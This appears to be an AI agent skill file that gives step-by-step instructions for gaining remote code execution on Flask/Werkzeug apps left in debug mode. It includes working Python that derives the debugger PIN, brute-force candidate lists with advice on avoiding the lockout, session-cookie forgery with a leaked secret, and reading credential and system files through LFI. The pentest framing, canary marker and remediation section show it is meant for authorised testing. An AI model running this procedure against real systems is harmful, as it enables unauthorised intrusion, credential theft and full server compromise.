---
name: flask-debug-rce
description: Use when a Flask/Werkzeug app runs with debug=True (every 500 leaks source + traceback, /console interactive debugger). Do the SOURCE-DISCLOSURE path FIRST — read app.py line-by-line for sinks (eval/exec/os.system/SECRET_KEY/hardcoded creds/SQL) and exploit each. The PIN-locked console is a SECONDARY path (derive PIN from machine-id+MAC+username+mod_path).
---

# Flask / Werkzeug Debug Mode → RCE (source disclosure FIRST, then PIN)

**Trigger:** a Flask/Werkzeug app with `debug=True`. Every uncaught 500 returns a
full traceback **with source code of the failing frames**, and `/console` serves an
interactive debugger (`EVALEX=true`). This is a **two-path RCE surface** — always
take the cheaper path first.

## Path 1 — Source disclosure (do this FIRST, no PIN needed)

The 500 traceback + the debugger's source view leak the app's source line-by-line.
**Read it and enumerate every dangerous sink — each is a separate finding + exploit
chain:**

1. **`eval(...)` / `exec(...)`** — if any user input reaches eval/exec, that is
   DIRECT RCE. Test it: send a benign marker first (e.g. `1+1` → `2`), then a
   timing/echo payload to prove execution (sleep vs no-sleep, or write a marker
   file to a served path and fetch it). This is usually the fastest route to RCE.
2. **`SECRET_KEY` / hardcoded secrets** — a leaked `SECRET_KEY = "..."` lets you
   forge Flask session cookies (`flask-unsign --sign --secret ...`) → auth bypass.
3. **Hardcoded credentials** — `admin:qwerty`, basic-auth pairs, DB passwords in
   comments → login directly.
4. **SQL string building** — `f"... WHERE x = '{input}'"` → confirm the SQLi
   separately.
5. **`requests.get(user_url)` / `os.system(...)` / `subprocess(...)`** — SSRF /
   command injection sinks.

Save the leaked source to a file and run `blitz_file` / `taint_file` on it to
enumerate entry points → sinks mechanically, so nothing is missed.

## Path 2 — PIN-locked console (secondary; only if Path 1 is exhausted)

If no direct sink is reachable, derive the debugger PIN to unlock the console:

The PIN is **derived deterministically** (not stored in the DB) from six machine
values. Gather them, compute the PIN, unlock the console, and prove RCE.

## The six inputs

The Werkzeug debugger PIN is computed from `probably_public_bits` +
`private_bits`:

```
probably_public_bits = [
    username,        # the OS user running the app (getpass.getuser())
    "flask.app",     # modname — always this for Flask
    "Flask",         # getattr(app, "__name__", ...) — always "Flask"
    mod_path,        # absolute path to flask/app.py, e.g.
                     # "/usr/local/lib/python3.8/site-packages/flask/app.py"
]
private_bits = [
    str(uuid.getnode()),  # MAC address as a DECIMAL integer
    machine_id,           # /etc/machine-id (or /proc/sys/kernel/random/boot_id)
]
```

### How to gather each (priority order)

1. **mod_path** — usually visible in the 500 traceback (the Flask app file path).
   For a Docker Flask app, `/app/app.py` and the site-packages path both matter:
   you want the path Werkzeug knows (the `__file__` of the `flask.app` module,
   typically `/usr/local/lib/python3.8/site-packages/flask/app.py`).
2. **username** — from the traceback, a `whoami`-equivalent in the debugger, or
   `/etc/passwd` via LFI. Common: `root`, `app`, `www-data`, `flask`.
3. **MAC address** — `/sys/class/net/eth0/address` (or `/proc/net/arp`) via LFI,
   or `cat /sys/class/net/*/address`. Convert hex → decimal:
   `int("aa:bb:cc:dd:ee:ff".replace(":", ""), 16)`.
4. **machine_id** — `/etc/machine-id` via LFI; fallback
   `/proc/sys/kernel/random/boot_id`.

## Compute the PIN (Werkzeug 2.x algorithm)

```python
import hashlib
from itertools import chain

probably_public_bits = [username, "flask.app", "Flask", mod_path]
private_bits = [str(uuid_int), machine_id]   # uuid_int = MAC as decimal

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
rv = None
for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
        rv = "-".join(num[x:x+group_size].rjust(group_size, "0")
                      for x in range(0, len(num), group_size))
        break
else:
    rv = num
print("PIN:", rv)
```

Known-good public reference for the same algorithm (Werkzeug
`werkzeug/debug/__init__.py` — `get_pin_and_cookie_name`). A searchable
reimplementation: `werkzeug-debug-console-bypass` scripts on GitHub.

## Brute-force the remaining unknowns

When some bits are unknown (e.g. MAC or machine_id), enumerate the plausible set
and compute a candidate PIN per combination:

- usernames: `root, app, www-data, flask, nobody, docker, 1000, user`
- mod_path: the traceback path AND every `site-packages/flask/app.py` variant for
  the Python version (`3.7, 3.8, 3.9, 3.10, 3.11, 3.12`).
- MAC: iterate the interfaces (`eth0, wlan0, docker0`) × observed OUI prefixes.
- machine_id: exact 32-hex from LFI, or the boot_id fallback.

Mind the lockout: Werkzeug locks after ~10 wrong PINs until the process restarts.
Batch candidates carefully and stop before exhaustion.

## Verify RCE (marker + negative control)

1. `GET /console` with the derived PIN → `{"auth": true}`.
2. Submit `eval("'BLITZSTRIKE_'" + 'CANARY')` via the console exec → marker returns.
3. Negative control: a wrong PIN → `{"auth": false}` (proves the auth check is
   real, not a hardcoded success).
4. Optional proof: `eval("open('/etc/passwd').read()[:20]")` → `root:x:0:0` — but
   keep it minimal-impact; the marker already proves RCE.

## Report it

Classify as RCE (CWE-94, CVSS 9.8) once `auth:true` + code execution is proven.
Root cause: `debug=True` in production + predictable PIN inputs. Remediation:
disable the debugger in production (`debug=False`), never expose `/console`, and
remove the debug PIN entirely.

## Related

- Werkzeug source: `werkzeug/debug/__init__.py` (`get_pin_and_cookie_name`).
- `flask-unsign` — forge session cookies when the Flask secret is leaked (separate
  chain: session forgery → auth bypass).
